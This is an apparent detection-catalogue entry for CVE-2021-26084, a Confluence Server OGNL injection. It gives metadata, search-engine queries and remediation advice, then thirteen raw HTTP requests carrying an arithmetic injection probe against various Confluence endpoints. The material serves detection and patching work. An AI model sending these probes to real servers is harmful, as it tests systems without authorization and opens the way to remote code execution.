---
layout: post
cve_id: CVE-2021-26084
title: Confluence Server - Remote Code Execution
pcap: true
pcap_path: /pcaps/2021/CVE-2021-26084.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-26084.yaml
snort2_rule: N/A
snort3_rule: N/A
author: dhiyaneshDk,philippedelteil
severity: critical
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary code on the affected server.

  '
remediation: 'Apply the latest security patches provided by Atlassian to mitigate
  this vulnerability.

  '
reference:
- https://jira.atlassian.com/browse/CONFSERVER-67940
- https://github.com/httpvoid/CVE-Reverse/tree/master/CVE-2021-26084
- https://nvd.nist.gov/vuln/detail/CVE-2021-26084
- https://github.com/Udyz/CVE-2021-26084
- https://github.com/0xsyr0/OSCP
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-26084
  cwe-id: CWE-917
  epss-score: 0.9444
  epss-percentile: 0.99988
  cpe: cpe:2.3:a:atlassian:confluence_data_center:*:*:*:*:*:*:*:*
metadata:
  max-request: 13
  vendor: atlassian
  product: confluence_data_center
  shodan-query:
  - http.component:"Atlassian Confluence"
  - http.component:"atlassian confluence"
  fofa-query: app="atlassian-confluence"
tags:
- cve2021
- cve
- rce
- confluence
- injection
- ognl
- kev
- atlassian
- vkev
- vuln
---

## üîç Vulnerability Description
Confluence Server and Data Center contain an OGNL injection vulnerability that could allow an authenticated user, and in some instances an unauthenticated user, to execute arbitrary code on a Confluence Server or Data Center instance. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from  version 7.12.0 before 7.12.5. The vulnerable endpoints can be accessed by a non-administrator user or unauthenticated user if 'Allow people to sign up to create their account' is enabled. To check whether this is enabled go to COG > User Management > User Signup Options.

## üåê HTTP Request
```nohighlight
POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/15.1 Safari/605.1.15
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
```

```nohighlight
POST /wiki/pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.4.24
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
```

```nohighlight
POST /wiki/pages/createpage-entervariables.action HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
```

```nohighlight
POST /users/user-dark-features HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Safari/605.1.15
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
```

```nohighlight
POST /confluence/pages/createpage-entervariables.action HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
```

```nohighlight
POST /pages/doenterpagevariables.action HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
```

```nohighlight
POST /confluence/pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
```

```nohighlight
POST /pages/templates2/viewpagetemplate.action HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
```

```nohighlight
POST /templates/editor-preload-container HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
```

```nohighlight
POST /pages/createpage-entervariables.action HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
```

```nohighlight
POST /template/custom/content-editor HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8.1 Safari/605.1.15
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
```

```nohighlight
POST /pages/createpage.action?spaceKey=myproj HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
```

```nohighlight
POST /pages/createpage-entervariables.action HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb
```

